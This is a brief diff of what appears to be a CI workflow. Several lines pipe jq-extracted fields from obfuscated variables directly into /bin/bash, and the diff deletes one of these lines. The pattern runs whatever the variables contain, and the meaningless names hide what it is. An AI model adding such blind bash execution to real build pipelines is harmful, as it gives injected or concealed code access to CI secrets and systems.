@@ -32,7 +32,6 @@ jobs:
           printf '%s' "$qmo13244" | jq -r .vvf8161 | /bin/bash
           echo $ulw8 | jq -r .aptkl93 | /bin/bash
           printf '%s' "$s83" | jq -r .sn4643 | /bin/bash
-          printf '%s' "$bqn96475" | jq -r .ir9 | /bin/bash
           echo $cgq7 | jq -r .szdte9243 | /bin/bash
 
       - name: Save output
